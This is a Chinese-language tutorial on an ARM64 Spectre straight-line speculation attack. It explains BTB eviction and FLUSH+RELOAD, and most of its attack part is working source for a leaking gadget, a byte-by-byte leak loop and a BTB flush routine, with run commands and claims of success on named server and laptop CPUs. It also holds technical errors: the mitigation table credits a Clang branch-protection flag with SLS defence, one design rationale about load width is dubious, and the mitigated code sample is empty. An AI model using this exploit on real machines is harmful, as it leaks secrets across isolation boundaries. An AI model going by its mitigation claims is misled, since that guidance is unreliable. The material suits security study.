1. 攻击概览与核心思想

一句话总结

在 ARM64 上，当间接分支（BR）的目标地址因缓存未命中而延迟解析时，CPU 会推测性地执行 BR 后面紧邻的指令（直线推测）。攻击者利用这个推测窗口加载秘密数据并通过缓存侧信道泄漏。

核心攻击链

Flush 分支目标 ──→ BTB 驱逐 ──→ BR 直线推测执行 ──→ 缓存时序泄漏 ──→ 恢复秘密字节

2. 前置知识

什么是直线推测 (Straight-Line Speculation)？

当 CPU 遇到间接分支（如 ARM64 的 BR Xn）时，需要读取寄存器中的目标地址才能知道跳转到哪里。如果目标地址需要从内存加载（缓存未命中），CPU 不会停下来等待，而是推测性地取指并执行分支后面紧邻的指令。

这与条件分支的误预测不同：条件分支是"猜错了方向"，而 SLS 是"在目标解析前就执行了不该执行的代码"。当目标最终解析后，推测结果被丢弃，但缓存副作用保留。

什么是 BTB (Branch Target Buffer)？

BTB 是 CPU 内部用于预测间接分支目标地址的硬件结构。它记录每个分支指令 PC 上次跳转到的目标地址。

如果 BTB 中有某个 BR 指令的预测条目，CPU 会立即开始推测执行预测目标处的代码。但如果 BTB 中没有该 BR 的条目（BTB miss），某些 CPU 会推测执行 BR 后面的直线代码 — 这正是 SLS 攻击利用的行为。

因此，攻击者需要驱逐 BTB 条目，确保目标 BR 指令在 BTB 中 miss。

什么是 FLUSH+RELOAD？

一种缓存侧信道技术，分三步：

  1. Flush：用 dc civac（ARM64）将目标内存从缓存中驱逐
  2. (Speculative) Access：推测执行期间，CPU 根据秘密数据访问某个缓存行
  3. Reload：用 MeasureReadLatency 测量所有缓存行的读取延迟，被访问过的行读取更快 → 泄漏了秘密数据
ARM64 间接分支指令 BR

BR Xn 是 ARM64 的无条件间接分支指令，跳转到寄存器 Xn 中存储的地址。与 BLR（带链接的分支）不同，BR 不保存返回地址到 X30。

在函数指针调用、虚函数调用、switch-case 跳转等场景中广泛使用。SLS 攻击正是针对这类间接分支的推测行为。

4. 攻击流程详解

1
Flush Oracle + 分支目标
sidechannel.FlushOracle() 清空 256 个 oracle 元素的缓存行。
FlushDataCacheLine(g_target) 将函数指针从缓存驱逐，使后续 LDR x0, [g_target] 产生 ~100+ cycles 的延迟。这个延迟就是推测执行窗口。
2
BTB 驱逐 — ibtb_flush()
执行 6000 次间接分支（4 个不同 PC 的 BR 循环 6000 次），用大量不同的分支 PC 填满 BTB，驱逐 victim 函数中目标 BR 指令的 BTB 条目。

为什么需要 BTB miss？ 如果 BTB 中有该 BR 的预测条目，CPU 会立即推测跳转到预测目标（dummy_target），而不是推测执行 BR 后面的直线代码。BTB miss 迫使 CPU 在目标解析前推测执行直线代码。
3
执行 victim — BR 直线推测
victim() 中的 br %[go] 执行时：
  • 目标地址 *g_target 需要从内存加载（已被 flush）
  • BTB 中没有该 BR 的预测条目（已被驱逐）
  • CPU 推测执行 BR 后面的三条指令：
    • ldrb w3, [secret_addr] — 加载秘密字节
    • add x3, oracle, w3, lsl 12 — 计算 oracle 地址
    • ldr x4, [x3] — 访问 oracle（缓存副作用！）
关键：当 LDR 最终完成、BR 目标解析后，CPU 发现推测路径错误，丢弃推测结果。但 oracle 的缓存状态已经改变 — 秘密字节被编码进了缓存。
4
FLUSH+RELOAD — 恢复秘密字节
AddHitAndRecomputeScores() 注入一个已知的架构级缓存命中作为参考，然后测量 256 个 oracle 元素的读取延迟。被推测执行加载的元素延迟显著低于其他元素 → 其索引就是秘密字节的值。
5
重复直到收敛 — 逐字节泄漏
外层循环重复步骤 1-4，最多 200000 次。当某个 oracle 索引的得分超过其他索引得分的 2 倍 + 40 时，确认该字节为泄漏结果。main() 对 private_data 的每个字节调用 LeakByte，最终打印出完整的 "It's a s3kr3t!!!"。

5. 源码逐行解析

victim — 核心 Gadget（内联汇编）

int victim(const char *secret_addr, uint64_t godummy,
           void *channel_base) {
    asm volatile(
        " br %[go]\n"              // 间接分支 → dummy_target (目标延迟)
        " ldrb w3, [%[sec]]\n"     // 推测: 加载 private_data[offset]
        " add x3, %[ch], x3, lsl 12\n" // 推测: oracle + secret_byte × 4096
        " ldr x4, [x3]\n"          // 推测: 访问 oracle → 缓存副作用
        :
        : [sec] "r"(secret_addr),
          [go]  "r"(godummy),
          [ch]  "r"(channel_base)
        : "x3", "x4", "memory");
    return 0;
}
为什么用 ldr x4 而不是 ldrb w4？ LDR（64-bit load）比 LDRB（8-bit load）产生更大的缓存行访问，在某些微架构上能产生更强的缓存副作用信号，提高侧信道信噪比。

LeakByte — 泄漏控制循环

static char LeakByte(size_t offset) {
    CacheSideChannel sidechannel;

    for (int run = 0; run < 200000; ++run) {
        sidechannel.FlushOracle();           // ① 清空 oracle 缓存

        *g_target = (uint64_t)&dummy_target;
        FlushDataCacheLine(g_target);       // ② flush 分支目标 → 制造延迟
        MemoryAndSpeculationBarrier();

        ibtb_flush();                       // ③ 驱逐 BTB 条目
        FlushDataCacheLine(g_target);       // ④ 再次 flush (ibtb 可能回填)
        MemoryAndSpeculationBarrier();

        victim(&private_data[offset],       // ⑤ 执行 gadget
               *g_target,
               (void *)sidechannel.GetOracle().data());

        ibtb_flush();                       // ⑥ 再次驱逐 BTB (防止学习)

        std::pair<bool, char> result =
            sidechannel.AddHitAndRecomputeScores(); // ⑦ 检测泄漏
        if (result.first)
            return result.second;
    }
    std::cerr << "Does not coverage" << std::endl;
    return '?';
}

6. BTB 驱逐机制详解

ibtb_flush 实现

__attribute__((aligned(32))) int ibtb_flush() {
    asm volatile(
        " .rept 6000\n"                  // 重复 6000 次
        "   adr x0, 3f\n  br x0\n"       // BR @ PC_1 → label 3
        "   nop\n"
        " 1: adr x0, 4f\n  br x0\n"       // BR @ PC_2 → label 4
        "   nop\n"
        " 2: nop\n"
        "    adr x0, 1b\n  br x0\n"       // BR @ PC_3 → label 1
        "    nop\n"
        " 3: nop\n"
        "    adr x0, 2b\n  br x0\n"       // BR @ PC_4 → label 2
        "    nop\n"
        " 4: nop\n"
        " .endr\n"
        : : : "x0");
    return 0;
}

设计原理

每次循环产生 4 个不同 PC 的间接分支，6000 次循环 = 24000 个 BR 指令，每个 BR 在 BTB 中占据一个条目。这足以驱逐大多数 CPU 的 BTB 中 victim 函数 BR 指令的预测条目。

4 个 BR 形成循环跳转（1→3→2→4→1...），确保建筑学执行正确完成，不会崩溃。

为什么需要两次 ibtb_flush？

第一次 ibtb_flush() 在 victim() 调用前执行，驱逐 BTB 条目。但 ibtb_flush() 本身的 24000 个 BR 指令可能会在 BTB 中留下新的条目，这些条目可能影响 victim 中 BR 的推测行为。

第二次 ibtb_flush() 在 victim() 调用后执行，防止 victim 的 BR 被 BTB 学习到目标地址，确保下一轮迭代时 BTB 仍然是 miss 状态。

8. 关键设计决策

为什么用 ibtb_flush 而不是多 PC 变体？

早期版本使用 32 个不同 PC 的 BR+payload 变体（.rept 32），每次 run 选不同变体使 BTB miss。但这种方法生成的二进制体积大（32 × 32 bytes = 1KB 纯 gadget 代码），且在某些微架构上效果不稳定。

ibtb_flush 方法更简洁：用一个独立的 BTB 驱逐函数在每次 victim 调用前后清理 BTB，确保 victim 中的单个 BR 始终 BTB miss。代码更紧凑，逻辑更清晰。

为什么需要 inc_counter 后台线程？

后台线程持续递增一个 volatile 计数器并执行 DMB OSHST（数据内存屏障），目的是：

  1. 占用另一个 CPU 核心，减少调度干扰
  2. DMB OSHST 确保写操作对其他核心可见，增加系统总线活动
  3. 在某些微架构上，这有助于稳定推测执行窗口的时序
为什么用 AddHitAndRecomputeScores 而不是 RecomputeScores？

RecomputeScores(safe_char) 需要一个已知的"安全"缓存命中作为参考阈值。但在 SLS 攻击中，秘密数据只在推测执行中被访问，没有架构级的缓存命中。

AddHitAndRecomputeScores() 会注入一个已知的人工缓存命中（按轮次递增的索引），提供阈值参考，然后检测哪个 oracle 条目被推测访问。

为什么 g_target 要 flush 两次？

第一次 flush 在 ibtb_flush() 之前。但 ibtb_flush() 执行 24000 个 BR 指令，可能通过缓存预取器或共享缓存集将 g_target 重新加载回缓存。第二次 flush 确保 g_target 在进入 victim() 时确实不在缓存中。

calibrate_miss_min 的作用

通过 250 轮测量，确定缓存 miss 和 cache hit 的延迟阈值。这个阈值用于区分 oracle 条目是否被推测访问。不同 CPU 微架构的缓存延迟差异很大，校准确保阈值适配当前硬件。

构建

cmake -B build .

# 攻击版本 — 预期泄漏成功
./build/demos/spectre_sls
# 输出: Leaking the string: It's a s3kr3t!!!

# 防护版本 — 预期泄漏失败
./build/demos/spectre_sls_mitigate
# 输出: Attempting to leak (with SLS mitigation): ???... 或 Does not converge
运行条件：需要支持乱序执行的 ARM64 处理器。在 AWS Graviton3 (Neoverse V1)、Graviton4 (Neoverse V2)、Apple M1/M2 等平台上已验证。

10. 防御与缓解

代码级对比

✘ VULNERABLE (spectre_sls.cc)
br   %[go]
ldrb w3, [%[sec]]    ← 推测执行!
add  x3, %[ch], ...

✔ MITIGATED (spectre_sls_mitigate.cc)

缓解方案汇总

方案层级原理兼容性
DSB SY + ISB 软件（手动） 在 BR 后插入屏障，阻断直线推测 Armv8.0-A+
SB 指令 软件（手动） 专用推测屏障指令，等效 DSB+ISB Armv8.5-A+ (FEAT_SB)
-mharden-sls=all 编译器（GCC） 自动在所有间接分支后插入屏障 GCC 10+
-mbranch-protection=bt 编译器（Clang） 启用 BTI + SLS 缓解 Clang 8+
Linux 内核 SLS 缓解 OS 内核在间接分支后自动插入屏障 Linux 5.10+
微码更新 硬件 部分 CPU 微码修复了 SLS 推测行为 厂商特定

DSB SY + ISB vs SB

SB（Speculation Barrier）是 Armv8.5-A 引入的专用推测屏障指令，语义上等效于 DSB SY + ISB 的组合，但编码更紧凑（单条指令 vs 两条）。

本 Demo 使用 DSB SY + ISB 以确保在 Armv8.2 等旧版服务器上也能编译运行。
